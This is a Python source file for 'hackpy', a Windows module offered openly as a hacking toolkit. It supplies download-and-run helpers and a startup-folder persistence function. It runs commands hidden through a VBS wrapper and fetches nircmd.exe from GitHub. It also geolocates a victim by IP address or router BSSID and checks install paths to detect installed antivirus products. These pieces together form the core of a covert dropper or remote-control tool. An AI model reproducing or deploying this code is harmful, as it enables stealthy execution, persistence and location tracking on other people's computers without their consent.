logo = ("""
    _  _     _   _                  _        ____
  _| || |_  | | | |   __ _    ___  | | __   |  _ \   _   _
 |_  ..  _| | |_| |  / _` |  / __| | |/ /   | |_) | | | | |
 |_      _| |  _  | | (_| | | (__  |   <    |  __/  | |_| |
   |_||_|   |_| |_|  \__,_|  \___| |_|\_\   |_|      \__, |
         Module Created by LimerBoy with Love <3     |___/
""")

# Check system
from platform import system as platform_system
if platform_system().lower() != 'windows':
	raise OSError('I\'m work only in Windows, system ' + platform_system() + ' not supported!')


# Import modules
from os import system as os_system
from os import path as os_path
from os import mkdir as os_mkdir
from os import remove as os_remove
from os import environ as os_environ
from os import startfile as os_startfile
from json import load as json_load
from time import sleep as time_sleep
from shutil import move as shutil_move
from wget import download as wget_download
from getmac import get_mac_address as getmac
from random import randint as random_randint

install_path = os_environ['TEMP'] + '\\hackpy'
def configure(path = os_environ['TEMP'] + '\\hackpy'):
	global install_path
	install_path = path
	if not os_path.exists(path):
		os_mkdir(path)

# Load file from URL
def wget(link, statusbar = None, output = None):
	if output == None:
		return wget_download(link, bar = statusbar)
	else:
		return wget_download(link, bar = statusbar, out = output)

# Start file
def start(file):
	os_startfile(file)

# Add to startup.
def autorun(path, file, name, state=True):
	autorun_path = (os_environ['SystemDrive'] + '\\Users\\' + os_environ['USERNAME'] + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
	if os_path.exists(path + '\\' + file):
		if state == True:
			with open(autorun_path + '\\' + name + ".bat", "w") as tempfile:
				tempfile.write('@cd ' + path + '\n@start "" ' + file)
		else:
			try:
				os_remove(autorun_path + '\\' + name + '.bat')
			except FileNotFoundError:
				raise FileNotFoundError('hackpy - Failed to remove file: ' + file + ' from startup')
	else:
		raise FileNotFoundError('hackpy - Failed to add file: ' + file + ' to startup')


# Load nircmdc.exe
def load(architecture=32, statusbar = None):
	if os_path.exists(install_path + '\\nircmdc.exe'):
		return True
	else:
		if architecture == 64:
			nircmdc_file_part = 'nircmdc'
		else:
			nircmdc_file_part = 'nircmd'

		nircmdc_temp_file = wget_download('https://raw.githubusercontent.com/LimerBoy/nirpy/master/' + nircmdc_file_part + '.exe', bar = statusbar)
	shutil_move(nircmdc_temp_file, install_path + '\\nircmdc.exe')
	return True

# Unload (delete) nircmdc.exe from system
def unload():
	if os_path.exists(install_path):
		os_remove(install_path + '\\nircmdc.exe')
		return True
	else:
		raise FileNotFoundError('hackpy - Failed to delete file. It does not exist')
		return False

# Clean temp hackpy cache
def clean():
	system('@cd ' + install_path + ' && @del *.bat > NUL && @del *.vbs > NUL')

# Execute system command
def system(command):
	# Temp files names
	bat_script_path = install_path + '\\' + 'bat_script_' + str(random_randint(1, 100000)) + '.bat'
	vbs_script_path = install_path + '\\' + 'vbs_script_' + str(random_randint(1, 100000)) + '.vbs'
	# Temp files commands
	bat_script = '@' + command
	vbs_script = 'CreateObject(\"WScript.Shell\").Run \"cmd.exe /c ' + bat_script_path + '\", 0, false'
	# Write bat commands
	with open(bat_script_path, "w") as bat_script_write:
		bat_script_write.write(bat_script)
	# Write vbs commands
	with open(vbs_script_path, "w") as vbs_script_write:
		vbs_script_write.write(vbs_script)
	time_sleep(0.1)
	os_startfile(vbs_script_path)

# Execute nircmdc command
def nircmdc(command, priority='NORMAL'):
	# Check nircmdc.exe file
	if os_path.exists(install_path + '\\nircmdc.exe'):
		system('@start /MIN /B /' + priority + ' ' +  install_path + '\\nircmdc.exe' + ' ' + command)
	else:
		raise FileNotFoundError('hackpy - You don\'t loaded nircmdc.exe please make hackpy.load() after importing this module.')

# Get info by ip address
# WARNING! Usage limits:
# This endpoint is limited to 150 requests per minute from an IP address. If you go over this limit your IP address will be blackholed. You can unban here: http://ip-api.com/docs/unban
def ip_info(ip = '', status_bar = None, out_tempfile = 'ip_info.json'):
    #  "query": "24.48.0.1",
    #  "status": "success",
    #  "country": "Canada",
    #  "countryCode": "CA",
    #  "region": "QC",
    #  "regionName": "Quebec",
    #  "city": "Saint-Leonard",
    #  "zip": "H1R",
    #  "lat": 45.5833,
    #  "lon": -73.6,
    #  "timezone": "America/Toronto",
    #  "isp": "Le Groupe Videotron Ltee",
    #  "org": "Videotron Ltee",
    #  "as": "AS5769 Videotron Telecom Ltee"
    wget_download('http://ip-api.com/json/' + ip, bar = status_bar, out = out_tempfile)
    with open(out_tempfile, "r") as tempfile:
        ip_data = json_load(tempfile)
    try:
        os_remove(out_tempfile)
    except:
        pass
    if ip_data.get('status') == 'success':
        return ip_data
    else:
        raise ConnectionError('Status: ' + ip_data.get('status') + ', Message: ' + ip_data.get('message'))

# Get LATITUDE, LONGITUDE, RANGE with bssid
def bssid_locate(bssid, statusbar = None, out_tempfile = 'bssid_locate.json'):
    wget_download('http://api.mylnikov.org/geolocation/wifi?bssid=' + bssid, bar = statusbar, out = out_tempfile)
    with open(out_tempfile, "r") as tempfile:
        bssid_data = json_load(tempfile)
    try:
        os_remove(out_tempfile)
    except:
        pass

    if bssid_data['result'] == 200:
        return bssid_data['data']

# Get router BSSID
def router(router_urls = ['192.168.0.1', '192.168.1.1', '192.168.2.1', '10.0.0.2', '10.0.1.1', '10.1.1.1']):
    for address in router_urls:
        BSSID = getmac(ip = address)
        if BSSID == None:
            continue
        else:
            break
    return BSSID

# Detect installed antivirus software
def detect_protection():
    SYS_DRIVE = os_environ['SystemDrive'] + '\\'
    detected = {}
    av_path = {
     'AVAST 32bit': 'Program Files (x86)\\AVAST Software\\Avast',
	 'AVAST 64bit': 'Program Files\\AVAST Software\\Avast',
	 'AVG 32bit': 'Program Files (x86)\\AVG\\Antivirus',
     'AVG 64bit': 'Program Files\\AVG\\Antivirus',
	 'Avira 32bit': 'Program Files (x86)\\Avira\\Launcher',
	 'Avira 64bit': 'Program Files\\Avira\\Launcher',
     'Advanced SystemCare 32bit': 'Program Files (x86)\\IObit\\Advanced SystemCare',
	 'Advanced SystemCare 64bit': 'Program Files\\IObit\\Advanced SystemCare',
	 'Bitdefender 32bit': 'Program Files (x86)\\Bitdefender Antivirus Free',
	 'Bitdefender 64bit': 'Program Files\\Bitdefender Antivirus Free',
	 'Comodo 32bit': 'Program Files (x86)\\COMODO\\COMODO Internet Security',
	 'Comodo 64bit': 'Program Files\\COMODO\\COMODO Internet Security',
	 'Dr.Web 32bit': 'Program Files (x86)\\DrWeb',
	 'Dr.Web 64bit': 'Program Files\\DrWeb',
     'Eset 32bit': 'Program Files (x86)\\ESET\\ESET Security',
     'Eset 64bit': 'Program Files\\ESET\\ESET Security',
	 'Kaspersky 32bit': 'Program Files (x86)\\Kaspersky Lab',
	 'Kaspersky 64bit': 'Program Files\\Kaspersky Lab',
     'Malvare fighter 32bit': 'Program Files (x86)\\IObit\\IObit Malware Fighter',
	 'Malvare fighter 64bit': 'Program Files\\IObit\\IObit Malware Fighter',
	 'Norton 32bit': 'Program Files (x86)\\Norton Security',
	 'Norton 64bit': 'Program Files\\Norton Security',
     'Panda Security 32bit': 'Program Files\\Panda Security\\Panda Security Protection',
	 'Panda Security 64bit': 'Program Files (x86)\\Panda Security\\Panda Security Protection',
	 'Windows Defender': 'Program Files\\Windows Defender',
     '360 Total Security 32bit': 'Program Files (x86)\\360\\Total Security',
	 '360 Total Security 64bit': 'Program Files\\360\\Total Security'
     }

    for antivirus, path in av_path.items():
        if os_path.exists(SYS_DRIVE + path):
            detected[antivirus] = SYS_DRIVE + path

    return detected

if __name__ == '__main__':
	print(10 * '\n' + logo)
